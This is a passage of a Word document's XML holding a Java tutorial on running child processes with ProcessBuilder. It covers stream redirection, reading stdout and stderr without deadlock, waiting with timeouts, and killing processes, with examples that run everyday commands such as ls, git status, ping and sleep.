        <w:t>File stderr = new File("stderr.log");</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("javac", "NonExistentFile.java");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectOutput(Redirect.to(stdout)); // normal output → stdout.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectError(Redirect.to(stderr));  // error output → stderr.log</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>int exit = p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("Exit: " + exit);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("stdout.log: " + Files.readString(stdout.toPath()));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("stderr.log: " + Files.readString(stderr.toPath()));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// stderr.log will contain: error: file not found: NonExistentFile.java</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.8 `inheritIO()` — Inherit All Three Streams at Once</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>A convenience method that sets stdin, stdout, and stderr all to `INHERIT`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("top", "-n", "1");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.inheritIO(); // child process shares the JVM's console — output appears directly</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor(); // output streams straight to your terminal</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Reading Process Output — `getInputStream()` / `getErrorStream()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>These methods exist on the `Process` object (not `ProcessBuilder`). They give you Java `InputStream` objects connected to the child process's stdout and stderr.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>**Naming confusion:** `process.getInputStream()` gives you the process's **stdout** (you *read* it as input to Java). `process.getOutputStream()` gives you the process's **stdin** (you *write* to it from Java).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 `process.getInputStream()` — Read stdout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("ls", "-la").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Simple: read all at once (only safe for small output)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>byte[] bytes = p.getInputStream().readAllBytes();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String output = new String(bytes, StandardCharsets.UTF_8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(output);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Reading Line by Line with `BufferedReader`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("ps", "aux").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader reader = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String line;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>while ((line = reader.readLine()) != null) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("&gt;&gt;&gt; " + line);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 `process.getErrorStream()` — Read stderr Separately</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("ls", "/nonexistent");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(false); // keep streams separate (default)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Must read BOTH streams concurrently to avoid deadlock!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// If stderr fills up while you're blocking on stdout.readAllBytes(), you deadlock.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read stderr in a background thread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String[] stderrHolder = new String[1];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread errThread = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>stderrHolder[0] = new String(p.getErrorStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) { e.printStackTrace(); }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>errThread.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read stdout in main thread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String stdout = new String(p.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>errThread.join();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("stdout: " + stdout);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("stderr: " + stderrHolder[0]);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 `process.getOutputStream()` — Write to stdin</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Lets you send data to the process's standard input:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Run 'cat' which echoes whatever it receives on stdin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("cat").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Write to process stdin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (PrintWriter writer = new PrintWriter(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new OutputStreamWriter(p.getOutputStream(), StandardCharsets.UTF_8))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>writer.println("Line 1 sent to process");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>writer.println("Line 2 sent to process");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// CRITICAL: close the stream to signal EOF to the process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Read what cat echoed back</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String output = new String(p.getInputStream().readAllBytes());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println(output);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.5 The Deadlock Problem — Always Use Threads</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The classic deadlock scenario:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Main thread:  p.getInputStream().readAllBytes()  ← blocks, waiting for process to finish</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Child process: waiting for stderr pipe buffer to drain ← blocks, waiting for Java to read stderr</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Result: both sides wait forever — DEADLOCK</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>**Safe pattern — always read both streams in parallel:**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static ProcessResult runProcess(List&lt;String&gt; command) throws Exception {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder(command);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Collect stdout in background thread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>StringBuilder stdout = new StringBuilder();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread outThread = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader br = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(p.getInputStream()))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>br.lines().forEach(line -&gt; stdout.append(line).append('\n'));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) { /* handle */ }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Collect stderr in background thread</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>StringBuilder stderr = new StringBuilder();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread errThread = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader br = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(p.getErrorStream()))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>br.lines().forEach(line -&gt; stderr.append(line).append('\n'));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IOException e) { /* handle */ }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>outThread.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>errThread.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>int exitCode = p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>outThread.join();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>errThread.join();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>return new ProcessResult(exitCode, stdout.toString(), stderr.toString());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>record ProcessResult(int exitCode, String stdout, String stderr) {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.6 Reading with `redirectErrorStream(true)` — The Simple Path</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>If you merge stderr into stdout, you only have one stream to read and deadlock is impossible:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("git", "status");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.directory(new File("/path/to/repo"));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true); // merge stderr → stdout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String output = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>int exit = p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.7 Streaming Output in Real-Time (Long-Running Processes)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>For processes that run a long time and produce continuous output:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder("ping", "-c", "5", "google.com");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Stream output line by line as it arrives</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try (BufferedReader reader = new BufferedReader(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>new InputStreamReader(p.getInputStream()))) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>String line;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>while ((line = reader.readLine()) != null) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("[" + Instant.now() + "] " + line);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>int exit = p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Done. Exit: " + exit);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. `process.waitFor()` and `process.waitFor(timeout, unit)`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 `waitFor()` — Block Until Process Exits</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Causes the current thread to wait until the process terminates. Returns the exit value (0 = success by convention; non-zero = error).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("sleep", "2").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("Waiting...");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>int exitCode = p.waitFor(); // blocks for ~2 seconds</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Exit code: " + exitCode); // 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>`waitFor()` throws `InterruptedException` if the waiting thread is interrupted. Always handle it:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>int exit = p.waitFor();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Exit: " + exit);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (InterruptedException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread.currentThread().interrupt(); // restore interrupted status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroy();                        // kill the child process</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throw new RuntimeException("Process interrupted", e);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 `waitFor(long timeout, TimeUnit unit)` — Wait with Timeout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Java 8+. Returns `true` if the process exited within the timeout, `false` if it timed out.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("sleep", "60").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>boolean finished = p.waitFor(5, TimeUnit.SECONDS);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if (finished) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process finished with exit code: " + p.exitValue());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process timed out — killing it");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>// Optionally wait for destruction to complete</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor(2, TimeUnit.SECONDS);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 `exitValue()` — Non-Blocking Exit Code Check</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Returns the exit value immediately. Throws `IllegalThreadStateException` if the process has not yet terminated.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Check without blocking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>int code = p.exitValue();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Already done: " + code);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (IllegalThreadStateException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process still running");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.4 `isAlive()` — Java 8+ Non-Blocking Status Check</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>while (p.isAlive()) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Still running...");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread.sleep(500);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Done. Exit: " + p.exitValue());</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.5 Full Timeout Pattern with Cleanup</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static int runWithTimeout(List&lt;String&gt; command, long timeoutSeconds)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throws IOException, InterruptedException {</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ProcessBuilder pb = new ProcessBuilder(command);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>pb.redirectErrorStream(true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Process p = pb.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Drain output in background (prevent pipe buffer deadlock)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread drainer = new Thread(() -&gt; {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>try { p.getInputStream().transferTo(OutputStream.nullOutputStream()); }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>catch (IOException ignored) {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>drainer.setDaemon(true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>drainer.start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>try {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>boolean completed = p.waitFor(timeoutSeconds, TimeUnit.SECONDS);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (!completed) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.err.println("Process timed out after " + timeoutSeconds + "s");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor(5, TimeUnit.SECONDS); // wait for destruction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>return p.exitValue();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>} catch (InterruptedException e) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Thread.currentThread().interrupt();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>throw e;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. `process.destroyForcibly()` — Killing Processes</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 `destroy()` vs `destroyForcibly()`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Method | Behavior |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `process.destroy()` | Sends a **graceful** termination signal (`SIGTERM` on Unix, `TerminateProcess` on Windows). The process may catch it and ignore it. |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `process.destroyForcibly()` | Sends a **forceful** kill signal (`SIGKILL` on Unix). Cannot be caught or ignored. Returns `Process` for chaining. |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("sleep", "100").start();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Graceful — process may handle cleanup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroy();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Check if it died</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (p.isAlive()) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process ignored SIGTERM — force killing");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Best Practice — Try Graceful, Then Force</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>public static void killProcess(Process p) throws InterruptedException {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (!p.isAlive()) return;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Step 1: request graceful shutdown</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroy();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Step 2: wait up to 3 seconds for graceful exit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>boolean graceful = p.waitFor(3, TimeUnit.SECONDS);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>// Step 3: force kill if still running</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if (!graceful &amp;&amp; p.isAlive()) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>System.err.println("Process did not exit gracefully — force killing (PID: "</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>+ p.pid() + ")");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.destroyForcibly();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>p.waitFor(2, TimeUnit.SECONDS);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>System.out.println("Process killed. Exit value: " + p.exitValue());</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 `process.pid()` — Java 9+: Get the OS Process ID</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Process p = new ProcessBuilder("sleep", "30").start();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
